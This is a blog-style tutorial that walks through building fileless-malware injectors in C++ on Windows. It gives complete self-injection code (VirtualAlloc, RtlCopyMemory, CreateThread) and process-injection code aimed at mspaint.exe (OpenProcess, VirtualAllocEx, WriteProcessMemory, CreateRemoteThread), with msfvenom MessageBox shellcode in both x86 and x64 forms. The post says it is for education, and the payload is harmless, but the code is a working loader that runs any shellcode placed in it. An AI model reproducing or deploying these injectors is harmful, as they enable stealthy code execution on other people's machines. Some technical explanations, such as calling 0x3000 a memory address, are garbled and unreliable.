---

title: "Steps on how to create and track Fileless Malware using Process and Self injection techniques in C++"
date: "2024-11-25 00:00:00"
categories: [Malware Analysis, FileLess Malware Analysis Project]
tags: [Malware Analysis]

---

# Injection techniques in Fileless Malware

The main purpose of using injection attacks is to inject the malicious code direclty to the memory instead of writting it and execute on the disk to avoid detections as we know that each running process has its own memory so attacker take advantage of this behaviour and instead of running malicious code to the disk they inject the malicious code to the process memory, and then the injected shellcode get executed. There are two types of injection techniques that are use in Fileless Malware Process injection and Self injections all of the injection attacks have three things in common.

# 1. Allocate Memory for Shellcode

In this step we allocate the memory for the malicious code(Shellcode) that they want to executed.

Allocate memory
![Aloc Mem](assets/img/filelessmal/allocatememshell.png)

# 2. Write Shellcode to the allocated Memory

In this step we write the malicious code (Shellcode) into allocated memory.

Writing shellcode to the allocated memory
![Wrt Mem](assets/img/filelessmal/writeshellcode.png)

# 3. Executing the Shellcode

In this step the we finally execute the shellcode in the memory

Execute shellcode
![Exe Shell](assets/img/filelessmal/execshellcode.png)


# Self Injection technique

It's a type of a Fileless attack in which we injects the malicious code or shellcode into the memory space, by reserving a block of memory first from the OS for allocation and then write the malicious code to that memory block and then execute the malicious code.


# Steps of Self Injection attack using C++ in Windows OS

We have to include the Windows.h header file into our C++ code so that we can use all of the API's for Windows OS, then we use a shellcode (x86) for the MessageBox into the main function (we can create any shellcode in Metapreter make sure that we use -c flag for C programming language).

```c++
#include <Windows.h>  // Windows.h header file for Windows API's
#include <stdio.h>
int main(int argc, char** argv) {
    unsigned char shellcode[] =   // Using MessageBox ShellCode created in Metapreter 
        "\xd9\xeb\x9b\xd9\x74\x24\xf4\x31\xd2\xb2\x77\x31\xc9\x64"
        "\x8b\x71\x30\x8b\x76\x0c\x8b\x76\x1c\x8b\x46\x08\x8b\x7e"
        "\x20\x8b\x36\x38\x4f\x18\x75\xf3\x59\x01\xd1\xff\xe1\x60"
        "\x8b\x6c\x24\x24\x8b\x45\x3c\x8b\x54\x28\x78\x01\xea\x8b"
        "\x4a\x18\x8b\x5a\x20\x01\xeb\xe3\x34\x49\x8b\x34\x8b\x01"
        "\xee\x31\xff\x31\xc0\xfc\xac\x84\xc0\x74\x07\xc1\xcf\x0d"
        "\x01\xc7\xeb\xf4\x3b\x7c\x24\x28\x75\xe1\x8b\x5a\x24\x01"
        "\xeb\x66\x8b\x0c\x4b\x8b\x5a\x1c\x01\xeb\x8b\x04\x8b\x01"
        "\xe8\x89\x44\x24\x1c\x61\xc3\xb2\x08\x29\xd4\x89\xe5\x89"
        "\xc2\x68\x8e\x4e\x0e\xec\x52\xe8\x9f\xff\xff\xff\x89\x45"
        "\x04\xbb\x7e\xd8\xe2\x73\x87\x1c\x24\x52\xe8\x8e\xff\xff"
        "\xff\x89\x45\x08\x68\x6c\x6c\x20\x41\x68\x33\x32\x2e\x64"
        "\x68\x75\x73\x65\x72\x30\xdb\x88\x5c\x24\x0a\x89\xe6\x56"
        "\xff\x55\x04\x89\xc2\x50\xbb\xa8\xa2\x4d\xbc\x87\x1c\x24"
        "\x52\xe8\x5f\xff\xff\xff\x68\x65\x58\x20\x20\x68\x6c\x63"
        "\x6f\x64\x68\x53\x68\x65\x6c\x31\xdb\x88\x5c\x24\x09\x89"
        "\xe3\x68\x6d\x58\x20\x20\x68\x76\x65\x6e\x6f\x68\x20\x6d"
        "\x73\x66\x68\x65\x20\x62\x79\x68\x6c\x63\x6f\x64\x68\x53"
        "\x68\x65\x6c\x31\xc9\x88\x4c\x24\x15\x89\xe1\x31\xd2\x52"
        "\x53\x51\x52\xff\xd0\x31\xc0\x50\xff\x55\x08";
```

# 1. Allocate Memory for Self Injection attack

In this first step we have to allocate the block of memory using "VirtualAlloc API function. VirtualAlloca function have 4 parametes.

1. Block of memmory where we want to allocate our code in memmory 
   we set it to "NULL" as a parameter to allow OS to allocate for us randomly.
2. sizeOf() How much memory we want to allocate for our 
   shellcode, in our case we use the "sizeOf(shellcode) of our shellcode.
3. (MEM_COMMIT | MEM_RESERVE) Is a allocation type we use 
   MEM_RESERVE and MEM_COMMIT to tell OS to reserve page block of memmory from the ram and commit(read and write) to this page we always have to reserve the page first and then read and write using commit, we use pipe to reserve the page from the mem and then commit, if we sum it up we MEM_COMMIT have hex value of 0x1000 and MEM_RESERVE have the hex value of 0x2000 to sum it up which is 0x3000 (which is the memory address in the ram).
4. PAGE_EXECUTE_READWRITE which allow us to read and write to the 
   memmory address in hex which is hex40

```c++
LPVOID allocated_mem = VirtualAlloc(NULL, sizeof(shellcode), (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);

if (allocated_mem == NULL) {
	printf("Failed to allocate memory: %d\n", GetLastError());
    return 1;
}
printf("Memory Allocated at address: 0x%p\n", allocated_mem);
```

# 2. Write Shellcode to the allocated memory.

In this secound step we write the Shellcode to the allocated memory using "RtlCopyMemory" API function. RTLCopyMemory have 3 parameters.

1. allocated_mem is the function call that we use as a first  
   parameter for the memory that is allocated for us by the OS.

2. shellcode is the code that we created in our previous step, 
   which we wants to write in our allocated memory.

3. sizeOf() in this parameter we pass the shellcode to get the 
   size of our shellcode that we want to write.

```c++
RtlCopyMemory(allocated_mem, shellcode, sizeof(shellcode));
printf("Shellcode is written to allocated memory!\n");
```

# 3. Executing the Shellcode 

In this last step we use "CreateThread" API function to execute our allocated shellcode so that it execute the MessageBox shellcode
CreateThread funciton takes 6 parameters but for this self injection we use 3 important parameters.

1. NULL we set this parameter to NULL.
2. 0 we use the value 0 for second parameter.
3. (LPTHREAD_START_ROUTINE) is to create thread process and 
   start it from the allocated_mem that we create (thread is basically use to run 2 or more funciton in parallel to reduce time) using type cast.(After it successfully created the thread it return the HANDLE).

```c++
HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)allocated_mem, NULL, 0, NULL);

    if (hThread == NULL) {
		printf("Failed to create thread: %d\n", GetLastError());
        return 1;
    }
    // Halt execution until created thread returns we use our hThread and set it to INFINITE
    WaitForSingleObject(hThread, INFINITE);
    // Close handle to thread
    CloseHandle(hThread);
    // Free allocated memory
    VirtualFree(allocated_mem, 0, MEM_RELEASE);

    return 0;
```
# Running and tracking the Self Injection attack

After successfully create a self injection attack we can run and execute the program on MS Visual Studio. After execution of the program we get the output on the console with the memory allocated
at address, and the shellcode is written to allocated memory.

Self injection attack output in C++
![Shell Inj](assets/img/filelessmal/selfinjoutput.png)

We can also track and check that our shellcode is injected into our process by checking the memory map in "Process Hacker" tool.


Self injection process from Process Hacker tool
![Shell Inj](assets/img/filelessmal/selfinjecprochac.png)


We can also check and match the new memory allocated address from the memmory map in Process Hacker tool which is same as the memory address that shows in MS Visual Studio output.

Self injection memory address matches with the memory address output in MS Visual Studio.
![Shell Inj](assets/img/filelessmal/sefinjsamememadd.png)


# Process Injection technique

It's a type of file less attack which is almost similar to the self injection but the difference is that we inject our malicious code or a shellcode into any running process of the program in the OS.


# Steps of Process Injection attack using C++ on MS Paint application process in Windows OS

Process Injection attack using the same steps similar to the Self injection attack, but there is an additional step first to get the handle
of the process then we perfrom the same 3 steps (Allocation, Write, and Execute) the Shellcode. process handle is like a door from which we get into the memory space of the process in this example we get the handle of th MS Paint process and then perform the similar Self Injection attack steps.

We have to include the Windows.h header file into our C++ code so that we can use all of the API's for Windows OS, then we use a shellcode (x86) for the MessageBox into the main function (we can create any shellcode in Metapreter make sure that we use -c flag for C programming language).

```c++
#include <Windows.h>  //use Windows.h header to use Windows API's
#include <tlhelp32.h> //use to access the defination for the Windows.h header
#include <stdio.h>

int main(int argc, char** argv) {
    // Define MessageBox shellcode (x64)  which is created in Metapreter
    unsigned char shellcode[] =
        "\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
        "\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
        "\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72"
        "\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac"
        "\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2"
        "\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"
        "\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f"
        "\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49"
        "\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01"
        "\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
        "\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1"
        "\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"
        "\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b"
        "\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58"
        "\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
        "\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7"
        "\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\xfe\x00\x00\x00\x3e"
        "\x4c\x8d\x85\x14\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83"
        "\x56\x07\xff\xd5\x48\x31\xc9\x41\xba\xf0\xb5\xa2\x56\xff"
        "\xd5\x53\x68\x65\x6c\x6c\x63\x6f\x64\x65\x20\x62\x79\x20"
        "\x6d\x73\x66\x76\x65\x6e\x6f\x6d\x00\x53\x68\x65\x6c\x6c"
        "\x63\x6f\x64\x65\x00";
```

# 1. Get a Handle of a MS Paint application process

To get a handle of the MS Paint process first we have to get the sanpshot of all the running process for that we first intiliaze the 
"PROCESSENTRY32 pe32" API which stores all the processes in the struct provided by Windows.h API and then we set the size member to the whole size of the struct, then we create the handle to take the snapshot of all the running process. to start checking for each process we have to check for the first process from the snapshot by using "Process32First(snapshot, &pe32)" API function which takes our snapshot and the pointer to pe32 struct and then perform the do while loop by using "Process32Next(snapshot, &pe32)" API function to check for the MS Paint process.

```c++
// Init PROCESSENTRY32 struct
    PROCESSENTRY32 pe32;
    // Set the size member to the whole size of the struct
    pe32.dwSize = sizeof(PROCESSENTRY32);
    // Take a snapshot of all running processes
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    // Get the first process info in the snapshot
    Process32First(snapshot, &pe32);
    // Loop through the whole snapshot until `mspaint.exe` is found
    do {
        // Check if we have a match for `mspaint.exe`
        if (wcscmp(pe32.szExeFile, L"mspaint.exe") == 0) {
            // Obtain a handle to `mspaint.exe`
            HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID);
            // Allocate memory in `mspaint.exe`
            LPVOID allocated_mem = VirtualAllocEx(hProcess, NULL, sizeof(shellcode), (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);

            if (allocated_mem == NULL) {

                printf("Memory allocation failed: %ul\n", GetLastError());

                return 1;
            }

            printf("Memory page allocated at: 0x%p\n", allocated_mem);
            // Write shellcode to the allocated memory in `mspaint.exe`
            WriteProcessMemory(hProcess, allocated_mem, shellcode, sizeof(shellcode), NULL);
            // Create a thread to execute shellcode
            HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)allocated_mem, NULL, 0, NULL);

            if (hThread == NULL) {

                printf("Falied to obtain handle to process: %ul\n", GetLastError());

                return 1;
            }
            // Halt execution until thread returns
            WaitForSingleObject(hThread, INFINITE);
            // Free allocated memory in `mspaint.exe`
            VirtualFreeEx(hProcess, allocated_mem, 0, MEM_RELEASE);
            // Close the handle to the created thread
            CloseHandle(hThread);
            // Close the handle to `mspaint.exe` process
            CloseHandle(hProcess);

            break;
        }
            // Enumerate the snapshot
    } while (Process32Next(snapshot, &pe32));

    return 0;
}

```

# 2. Allocate the memory for the Process Injection attack

From the above code inside our do while loop in the first if statement we check for the "mspaint.exe" process and if we find that process we open that process
by using "OpenProcess" API funciton to get the handle of that process, if we find the "mspaint.exe" process we use "VirtualAllocEx" API function same function that we use in Self Injection attack to allocate the memory in "mspaint.exe" process for our shellcode.


```c++
// Check if we have a match for `mspaint.exe`
        if (wcscmp(pe32.szExeFile, L"mspaint.exe") == 0) {
            // Obtain a handle to `mspaint.exe`
            HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID);
            // Allocate memory in `mspaint.exe`
            LPVOID allocated_mem = VirtualAllocEx(hProcess, NULL, sizeof(shellcode), (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);

            if (allocated_mem == NULL) {

                printf("Memory allocation failed: %ul\n", GetLastError());

                return 1;
            }

            printf("Memory page allocated at: 0x%p\n", allocated_mem);

```
# 3. Write the Shellcode to th MS Paint process

In this step we write the shellcode to the allocated memory in "mspaint.exe" by using function "WriteProcessMemory" API function which takes 
5 parameters

1. hProcess is a handle to a "mspaint.exe" process.
2. allocated_mem is the memory that we allocated for our shellcode in the "mspaint.exe" process.
3. shellcode malicious code that we created in the above steps from the Metapreter.
4. sizeOf(shellcode) the size of the shellcode which we wants to inject in "mspaint.exe" process.
5. NULL for the number of bytes if the function succeeds we leave it to NULL

```c++
            // Write shellcode to the allocated memory in `mspaint.exe`
            WriteProcessMemory(hProcess, allocated_mem, shellcode, sizeof(shellcode), NULL);
```

# 4. Execute the shellcode from the MS Paint process

In this final step we create the threat to execute the injected Shellcode using the "CreateRemoteThread" API function which takes the same parameter of the create threat in addition to the "hProcess" which is the handle to the MS Paint process. then we use "WaitForSingleObject" API function to pause the execution of the program until threat returns and then we use "VirtualFreeEx" function to free the allocated memory that we created for MS paint application. and finally we close the handle to
the threat using "CloseHandle" function and then break the loop.

```cpp
            // Create a thread to execute shellcode
            HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)allocated_mem, NULL, 0, NULL);

            if (hThread == NULL) {

                printf("Falied to obtain handle to process: %ul\n", GetLastError());

                return 1;
            }
            // Halt execution until thread returns
            WaitForSingleObject(hThread, INFINITE);
            // Free allocated memory in `mspaint.exe`
            VirtualFreeEx(hProcess, allocated_mem, 0, MEM_RELEASE);
            // Close the handle to the created thread
            CloseHandle(hThread);
            // Close the handle to `mspaint.exe` process
            CloseHandle(hProcess);

            break;
        }
```

# Running and tracking of the Process Injection attack

After successfully create a Process injection attack, first we open up the "mspaint.exe" so that the process is created and running we can track the process using "Process Hacker" or "Task Manager" tools under "explorer.exe" process and then run and execute our program we get the output on the console with the memory allocated at address, and the shellcode is written to allocated memory in the "mspaint.exe", as a result the popup messagebox "Shellcode by msfvenom" is showing as an output then the "mspaint.exe" application crashed.


Ouput after the execution of the program (note: mspaint.exe should be opened before the running and execution of the program)

![Proc Inj](assets/img/filelessmal/procinjmspain.png)


Process injection memory address of the "mspaint.exe" matches with the memory address output in MS Visual Studio.
![Shell Inj](assets/img/filelessmal/procinjematchadd.png)


# Conclusion 

This project helps me to understand how the self and process injection works in the Fileless Malware attacks. There are also many different types of Fileless Malware attacks. These are the most basic and common ones that can be easily understood by beginners in Cybersecurity who are interested in SOC and Security Analyst roles. Another thing that I would like to share is that this project is only used for educational and learning purposes. It's always good practice to run any types of malware in the sandbox environment that use for malware analysis.  